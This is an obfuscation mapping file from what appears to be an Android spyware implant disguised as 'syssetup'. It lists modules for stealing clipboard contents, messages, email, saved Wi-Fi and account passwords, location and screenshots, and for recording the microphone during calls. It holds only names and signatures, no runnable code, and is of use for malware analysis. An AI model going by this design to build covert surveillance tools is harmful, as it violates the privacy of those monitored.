android.media.AmrInputStream -> android.media.AmrInputStream:
    29:29:int notification(java.lang.Object) -> absolute
com.android.syssetup.module.ModuleClipboard -> stt.aM:
    android.text.ClipboardManager clipboardManager -> fg
    java.lang.String lastClip -> fh
    41:41:void actualStart() -> al
    45:46:void actualStop() -> am
    50:51:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    57:68:void actualGo() -> ak
    71:100:void getClipboard() -> cS
    103:128:void saveEvidence(java.lang.String) -> oH
    137:137:void resetLog() -> ch
    31:31:void access$000(com.android.syssetup.module.ModuleClipboard) -> absolute
com.android.syssetup.module.ModuleClipboard$1 -> stt.aN:
    com.android.syssetup.module.ModuleClipboard this$0 -> fi
    65:66:void run() -> run
com.android.syssetup.module.ModuleCrisis -> stt.aO:
    byte[] $ -> end
    40:42:void actualStart() -> al
    46:48:void actualStop() -> am
    53:81:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    86:86:void actualGo() -> ak
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleDevice -> stt.aP:
    boolean processList -> fj
    float cpuUsage -> fk
    long cpuTotal -> fl
    long cpuIdle -> fm
    byte[] $ -> end
    int $$ -> record
    97:97:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    108:163:void actualStart() -> al
    166:175:void getProcessList(java.lang.StringBuffer) -> absolute
    178:187:void getProperties(java.lang.StringBuffer) -> and
    191:236:long getSystem(java.lang.StringBuffer) -> array
    240:267:int getBattery(java.lang.StringBuffer) -> asm
    275:298:void readCpuUsage() -> cT
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleMessage -> stt.aQ:
    boolean mailEnabled -> fn
    boolean smsEnabled -> fo
    boolean mmsEnabled -> fp
    com.android.syssetup.module.message.MsgHandler msgHandler -> fq
    com.android.syssetup.evidence.Markup storedMMS -> fr
    com.android.syssetup.evidence.Markup storedSMS -> fs
    com.android.syssetup.evidence.Markup storedMAIL -> ft
    com.android.syssetup.evidence.Markup configMarkup -> fu
    java.util.Hashtable lastMail -> fv
    int lastMMS -> fw
    int lastSMS -> fx
    com.android.syssetup.module.message.Filter[] filterCollect -> fy
    com.android.syssetup.module.message.Filter[] filterRuntime -> fz
    com.android.syssetup.module.ModuleMessage$ProcessMailObserver obs -> fA
    java.util.concurrent.Semaphore stillReadingEmail -> fB
    byte[] $ -> end
    int $$ -> record
    90:161:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    165:188:boolean readJson$f9330da(int,java.lang.String,com.android.syssetup.conf.ChildConf,java.lang.String[]) -> absolute
    225:246:void actualStart() -> al
    251:266:void actualStop() -> am
    271:290:void actualGo() -> ak
    293:297:void initMail() -> cU
    300:305:void initSms() -> cV
    308:323:void initMms() -> cW
    327:334:void updateMarkupMMS(int) -> implementation
    340:342:void updateMarkupSMS(int) -> in
    349:362:void updateMarkupMail(java.lang.String,int,boolean) -> array
    367:400:java.lang.String[] getMailStores(java.lang.String) -> oI
    405:454:int readHistoricMail(java.util.Hashtable) -> absolute
    458:480:int readHistoricMms(int) -> inherited
    488:504:int readHistoricSms(int) -> inline
    508:516:void saveSms(com.android.syssetup.module.message.Sms) -> and
    519:536:void saveMms(com.android.syssetup.module.message.Mms) -> absolute
    540:547:boolean saveEmail(com.android.syssetup.module.email.Email) -> absolute
    552:577:void saveEvidenceEmail(com.android.syssetup.module.email.Email,java.lang.String) -> absolute
    585:609:boolean saveEvidenceSms(java.lang.String,byte[],long,boolean) -> absolute
    614:615:int notification(com.android.syssetup.module.message.Sms) -> absolute
    620:624:int notification(com.android.syssetup.module.message.Mms) -> and
    628:628:int getLastManagedMmsId() -> cX
    635:635:int getLastManagedSmsId() -> cY
    60:60:int notification(java.lang.Object) -> absolute
    60:60:java.util.Hashtable access$000(com.android.syssetup.module.ModuleMessage) -> absolute
    60:60:int access$100(com.android.syssetup.module.ModuleMessage,java.util.Hashtable) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleMessage$1 -> stt.aR:
    com.android.syssetup.module.ModuleMessage this$0 -> fC
    byte[] $ -> end
    377:377:boolean accept(java.io.File,java.lang.String) -> accept
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleMessage$2 -> stt.aS:
    com.android.syssetup.module.ModuleMessage this$0 -> fC
    byte[] $ -> end
    391:391:boolean accept(java.io.File,java.lang.String) -> accept
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleMessage$ProcessMailObserver -> stt.aQ$absolute:
    java.lang.String pObserving -> fD
    com.android.syssetup.module.ModuleMessage this$0 -> fC
    byte[] $ -> end
    201:215:int notification(com.android.syssetup.ProcessInfo) -> absolute
    191:191:int notification(java.lang.Object) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleMic -> stt.aT:
    byte[] AMR_HEADER -> eU
    com.android.syssetup.module.StandByObserver standbyObserver -> fE
    int numFailures -> fF
    long fId -> fG
    int[] amr_sizes -> eV
    android.media.MediaRecorder recorder -> co
    boolean phoneListening -> fH
    com.android.syssetup.module.ProcessObserver processObserver$377cb50b -> fI
    java.util.HashSet blacklist$5a95723b -> fJ
    boolean allowResume -> fK
    int index -> index
    byte[] unfinished -> fL
    boolean callOngoing -> fM
    byte[] $ -> end
    int $$ -> record
    83:99:void resetBlacklist() -> cZ
    109:120:boolean isSpeechRecognitionActivityPresented() -> da
    123:124:void addBlacklist(java.lang.String) -> oJ
    126:127:void delBlacklist(java.lang.String) -> oK
    129:129:boolean inInBlacklist(java.lang.String) -> oL
    133:133:com.android.syssetup.module.ModuleMic self() -> db
    143:145:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    161:190:void actualStart() -> al
    193:200:void startRecord() -> dc
    void specificStart() -> dd
    220:227:void actualStop() -> am
    void specificStop() -> de
    241:292:void actualGo() -> ak
    void specificGo(int) -> interface
    297:306:void addPhoneListener() -> df
    309:315:void removePhoneListener() -> dg
    319:339:void notifyProcess(com.android.syssetup.ProcessInfo) -> and
    347:452:void saveRecorderEvidence() -> dh
    byte[] getAvailable() -> di
    void stopRecorder() -> dj
    463:476:byte[] getAdditionalData() -> dk
    480:493:int notification(com.android.syssetup.Call) -> absolute
    497:510:int notification(com.android.syssetup.Standby) -> absolute
    514:523:boolean isForegroundBlacklist() -> dl
    529:551:boolean canRecordMic() -> dm
    void specificSuspend() -> dn
    558:582:void resume() -> resume
    585:596:void suspend() -> suspend
    599:601:void stop() -> stop
    53:53:int notification(java.lang.Object) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModuleMicL -> stt.aU:
    com.android.syssetup.file.AutoFile out_file -> fN
    byte[] unfinished -> fL
    42:44:void specificStop() -> de
    48:55:void specificGo(int) -> interface
    60:87:byte[] getAvailable() -> di
    101:149:void specificStart() -> dd
    152:158:void createSockets() -> dp
    161:168:void deleteSockets() -> dq
    179:205:void stopRecorder() -> dj
    212:216:void specificSuspend() -> dn
    234:248:void onInfo(android.media.MediaRecorder,int,int) -> onInfo
    254:255:void onError(android.media.MediaRecorder,int,int) -> onError
com.android.syssetup.module.ModulePassword -> stt.aV:
    com.android.syssetup.evidence.Markup markupPassword -> fO
    java.util.HashMap lastPasswords -> fP
    java.util.HashMap services -> fQ
    byte[] $ -> end
    int $$ -> record
    35:50:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    60:65:void actualStart() -> al
    73:125:void actualGo() -> ak
    133:169:boolean dumpWifi(java.lang.String) -> oM
    174:178:java.lang.String getValue(java.lang.String) -> getValue
    185:223:void dumpAccounts$ab453d1(com.android.syssetup.module.ModuleAddressBook$1) -> absolute
    233:240:java.lang.String getService(java.lang.String) -> oN
    246:254:int getServiceId(java.lang.String) -> oO
    261:261:void actualStop() -> am
    264:269:void addToEvidence(com.android.syssetup.evidence.EvidenceBuilder,java.lang.String,java.lang.String,java.lang.String,java.lang.String) -> absolute
    25:25:java.util.HashMap access$000(com.android.syssetup.module.ModulePassword) -> absolute
    25:25:com.android.syssetup.evidence.Markup access$100(com.android.syssetup.module.ModulePassword) -> and
    25:25:java.lang.String access$200(java.lang.String) -> oP
    25:25:void access$300$60323f41(com.android.syssetup.evidence.EvidenceBuilder,java.lang.String,java.lang.String,java.lang.String,java.lang.String) -> and
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModulePassword$1 -> stt.aW:
    com.android.syssetup.evidence.EvidenceBuilder evidence -> fR
    boolean needToSerialize -> fS
    com.android.syssetup.module.ModulePassword this$0 -> fT
    79:83:void close() -> close
    87:113:long cursor(android.database.Cursor) -> absolute
com.android.syssetup.module.ModulePosition -> stt.aX:
    boolean gpsEnabled -> fU
    boolean cellEnabled -> fV
    boolean wifiEnabled -> fW
    java.lang.Object position -> fX
    boolean scanning -> fY
    com.android.syssetup.module.ModulePosition$1 wifiReceiver$48665ecd -> fZ
    byte[] $ -> end
    64:91:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    96:115:void actualStart() -> al
    121:130:void locationWIFI() -> dr
    137:138:void locationGPS() -> ds
    148:170:void locationCELL() -> dt
    176:206:void onLocationChanged(android.location.Location) -> onLocationChanged
    214:232:void onWifiScan(java.util.List) -> absolute
    237:250:byte[] getAdditionalData(int,int) -> asm
    263:291:byte[] messageEvidence(byte[],int) -> file
    299:345:byte[] getWifiPayload(java.lang.String,java.lang.String,int) -> absolute
    355:392:byte[] getCellPayload(com.android.syssetup.CellInfo,int) -> absolute
    406:482:byte[] getGPSPayload(android.location.Location,long) -> absolute
    489:517:void registerWifiScan(android.net.wifi.WifiManager) -> absolute
    38:38:boolean access$002$3ce7ec7b(com.android.syssetup.module.ModulePosition) -> absolute
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.ModulePosition$1 -> stt.aY:
    android.net.wifi.WifiManager val$wifiManager -> ga
    com.android.syssetup.module.ModulePosition this$0 -> gb
    504:513:void onReceive(android.content.Context,android.content.Intent) -> onReceive
com.android.syssetup.module.ModuleSnapshot -> stt.aZ:
    android.view.Display display -> gc
    java.lang.String cameraSound -> gd
    int quality -> quality
    java.util.concurrent.Semaphore working -> ge
    boolean frameBuffer -> gf
    boolean screenCap -> gg
    byte[] $ -> end
    int $$ -> record
    83:106:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    125:165:void actualStart() -> al
    174:210:boolean screencapMethod() -> du
    228:229:android.graphics.Bitmap readPng(com.android.syssetup.file.AutoFile) -> asm
    237:369:boolean frameBufferMethod() -> dv
    374:379:boolean isBlack(byte[]) -> shr
    383:397:boolean isTablet() -> dw
    401:418:boolean usesInvertedColors() -> dx
    422:438:byte[] getAdditionalData() -> dk
    443:460:byte[] toJpeg(android.graphics.Bitmap) -> absolute
    465:499:byte[] getRawBitmap() -> dy
    java.lang.String $(int,int,int) -> absolute
com.android.syssetup.module.NullModule -> stt.ba:
    16:16:boolean parse$239843e2(com.android.syssetup.conf.ChildConf) -> and
    24:24:void actualGo() -> ak
    31:31:void actualStart() -> al
    38:38:void actualStop() -> am
com.android.syssetup.module.ProcessObserver -> stt.bb:
    com.android.syssetup.module.ModuleMic module$635ca5a0 -> gh
    com.android.syssetup.event.BaseEvent event -> gi
    22:25:int notification(com.android.syssetup.ProcessInfo) -> absolute
    7:7:int notification(java.lang.Object) -> absolute
com.android.syssetup.module.StandByObserver -> stt.bc:
    com.android.syssetup.module.ModuleMic moduleMic -> gj
    16:16:int notification(com.android.syssetup.Standby) -> absolute
    6:6:int notification(java.lang.Object) -> absolute
    208:218:java.lang.String chomp(java.lang.String,java.lang.String) -> div
    232:249:java.lang.String unspace(java.lang.String) -> oQ
    253:253:boolean isEmpty(java.lang.String) -> oR
    257:266:java.lang.String join$68fb8953(java.util.List,java.lang.String) -> absolute
    274:283:java.lang.String join$965d9d1(java.lang.String[],java.lang.String) -> absolute
    309:342:java.util.ArrayList readFileLines$3ff9fd98(java.lang.String) -> oS
    346:346:java.lang.String[] split(java.lang.String) -> split
com.android.syssetup.module.SubModule -> stt.bd:
    com.android.syssetup.evidence.Markup markup -> g
    com.android.syssetup.module.ModuleChat module$635ca5a0 -> gk
    boolean enabled -> enabled
    14:17:void init$561d1535(com.android.syssetup.module.ModuleChat,com.android.syssetup.evidence.Markup) -> absolute
    void start() -> start
    40:40:int notification(com.android.syssetup.ProcessInfo) -> absolute
    44:44:void startListen() -> dz
    47:47:void stopListen() -> dA
com.android.syssetup.module.SubModuleManager -> stt.be:
    com.android.syssetup.module.ModuleChat module$635ca5a0 -> gk
    java.util.ArrayList submodules$7865b31 -> gl
    29:33:void add$281572ce(com.android.syssetup.module.chat.SubModuleChat) -> absolute
    36:49:boolean start() -> dB
    53:65:boolean stop() -> dC
    69:72:boolean go() -> dD
    84:100:int notification(com.android.syssetup.ProcessInfo) -> absolute
com.android.syssetup.module.call.CallInfo -> stt.bf:
    int id -> id
    java.lang.String account -> gm
    java.lang.String peer -> gn
    java.lang.String displayName -> go
    boolean incoming -> case
    boolean valid -> inherited
    java.lang.String processName -> processName
    int programId -> gp
    java.util.Date timestamp -> cV
